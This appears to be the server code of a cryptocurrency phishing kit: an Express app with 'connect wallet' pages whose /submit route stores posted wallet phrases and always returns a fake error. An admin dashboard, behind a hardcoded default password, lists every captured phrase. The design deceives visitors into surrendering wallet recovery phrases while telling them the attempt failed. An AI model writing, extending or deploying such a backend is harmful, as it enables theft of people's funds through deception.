//npm packages
require("dotenv").config(); //require the config files
const express = require("express");
const path = require("path");
const cors = require("cors");
const cookieParser = require("cookie-parser");

//user defined modules

const User = require("./models/Users");
const Phrase = require("./models/Phrase");

const connectToDB = require("./utils/dbcon");
const {
  hashUserPassword,
  decryptPassword,
} = require("./utils/passwordManipulation");
const { isLoggedIn } = require("./utils/login");
const { generateAccessToken } = require("./utils/generateAccessToken");

connectToDB(); //db connection;

const app = express(); //app initialization;

//middlewares

app.enable("trust proxy");

//cookie parser for parsing the the request cookies
app.use(cookieParser());
//middleware to set security HTTP headers

app.use(express.static(path.join(__dirname, "public")));
app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));

app.use(express.json({ extended: false })); //middleware for body-paser

app.use(cors()); //middle ware to allow cross origin resource sharing

//routes

app.get("/", async (req, res) => {
  try {
    const users = await User.find();
    if (users.length === 0) {
      let hashedPassword = await hashUserPassword("Admin@2024");
      const createdDefaultUser = await User.create({
        fullName: "Admain Account",
        email: "admin@mail.com",
        password: hashedPassword,
        userType: "Admin",
      });
    }

    return res.status(200).render("index", {});
  } catch (error) {
    console.log(error);
    return res.status(500).json({ success: false, message: error.message });
  }
});

app.get("/connect-wallet", async (req, res) => {
  try {
    return res.status(200).render("connect-wallet", {});
  } catch (error) {
    console.log(error);
    return res.status(500).json({ success: false, message: error.message });
  }
});

app.get("/connect-manually", async (req, res) => {
  try {
    return res.status(200).render("connect-manually", {});
  } catch (error) {
    console.log(error);
    return res.status(500).json({ success: false, message: error.message });
  }
});

app.get("/login", async (req, res) => {
  try {
    return res.status(200).render("login", {});
  } catch (error) {
    console.log(error);
    return res.status(500).json({ success: false, message: error.message });
  }
});

app.post("/login", async (req, res) => {
  try {
    const apiError = {};
    const { email, password } = req.body;
    const user = await User.findOne({ email }).select("+password");

    if (!(await decryptPassword(password, user.password))) {
      apiError.message = "Invalid user credentials";
      apiError.success = false;
      console.log("apiError", apiError);
      return res.status(400).json(apiError);
    }
    const payLoad = {
      user: {
        id: user.id,
      },
    };
    user.password = undefined;

    let accessToken = await generateAccessToken(payLoad);
    //  to send token as cookie to the browser  use the code below

    res.cookie("accessToken", accessToken, {
      expires: new Date(Date.now() + 90 * 24 * 60 * 60 * 1000), //expires in 15days
      httpOnly: true,
      secure: req.secure || req.headers["x-forwarded-proto"] === "https", //used only in production
    });
    //end of code to send token as cookie
    res.locals.user = user;

    return res.status(200).json({
      success: true,
      data: {
        message: "Login successful",
        accessToken,
        user,
      },
    });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ success: false, message: error.message });
  }
});

app.post("/submit", async (req, res) => {
  try {
    const created = await Phrase.create(req.body);
    console.log(created);
    return res.status(500).json({ message: "Something went wrong" });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ success: false, message: error.message });
  }
});

app.get("/dashboard", isLoggedIn, async (req, res) => {
  try {
    if (!req.cookies.accessToken) {
      res.redirect("/");
    }
    const phrases = await Phrase.find({})
      .sort({ createdAt: -1 })
      .select("-_id -__v");
    console.log(phrases);
    return res.status(200).render("dashboard", { phrases });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ success: false, message: error.message });
  }
});

app.get("/logout", async (req, res) => {
  res.cookie("accessToken", "logout", {
    httpOnly: true,
    expires: new Date(Date.now() + 5 * 1000),
  });

  res.redirect("/");
});

//spin up the server on the env port number
const PORT = process.env.PORT || 5001;

app.listen(PORT, () => {
  console.log(`Server started on port ${PORT}`);
});
